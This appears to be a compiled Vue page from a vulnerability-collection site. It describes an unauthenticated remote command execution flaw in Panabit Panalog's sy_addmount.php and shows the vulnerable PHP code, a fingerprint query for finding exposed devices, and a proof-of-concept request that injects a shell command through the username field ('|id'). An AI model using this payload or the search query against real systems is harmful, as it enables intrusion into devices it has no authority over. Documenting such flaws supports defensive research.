import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as n,e as i}from"./app-58e4a7d6.js";const d={},s=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Panabit Panalog sy_addmount.php过滤不足，导致远程命令执行漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Panabit Panalog
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;Maintain/cloud_index.php&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314084818630.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的代码为 account/sy_addmount.php</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php

include(dirname(__FILE__).&quot;/../common.php&quot;);

$username = isset($_REQUEST[&quot;username&quot;]) ? $_REQUEST[&quot;username&quot;] : &quot;&quot;;
if (empty($username)) {
	echo &#39;{&quot;success&quot;:&quot;no&quot;, &quot;out&quot;:&quot;NO_USER&quot;}&#39;;
	exit;
}

$username = addslashes($username);

$rows = array();

$cmd = PANALOGEYE.&quot; behavior add account=$username&quot;;
exec($cmd, $out, $ret);
echo $out[0];
exit;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中没有对身份进行鉴权，且 username 可控，构造POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /account/sy_addmount.php

username=|id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314084851344.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),t=[s];function r(l,u){return a(),n("div",null,t)}const m=e(d,[["render",r],["__file","Panabit Panalog sy_addmount.php 远程命令执行漏洞.html.vue"]]);export{m as default};
